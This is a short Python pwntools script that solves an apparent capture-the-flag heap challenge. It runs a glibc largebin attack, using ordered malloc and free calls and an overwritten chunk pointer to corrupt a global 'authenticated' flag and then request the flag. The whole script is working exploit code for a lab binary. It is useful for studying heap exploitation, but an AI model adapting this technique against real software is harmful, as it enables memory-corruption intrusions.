# largebin attack -> modify `authenticated` to non-zero

from pwn import *

p1_size = 3100
p2_size = 3072
guard_size = 3080
trigger_size = 3130

context.arch = 'amd64'

p = process("/challenge/toddlerheap_level4.0")

def large_bin_attack(target:int):
    p.sendline(f"malloc 0 {p1_size}")
    p.sendline(f"malloc 1 {guard_size}")
    p.sendline(f"malloc 2 {p2_size}")
    p.sendline(f"malloc 3 {guard_size}")
    p.sendline(f"free 0")
    p.sendline(f"malloc 4 {trigger_size}")
    p.sendline(f"free 2")
    p.sendline(f'safe_read 0')
    p.send(b'\x00'*24 + p64(target - 0x20))
    p.sendline(f"malloc 5 {trigger_size}")


target = 0x4041c0
large_bin_attack(target)

p.sendline(b"send_flag")
p.interactive()
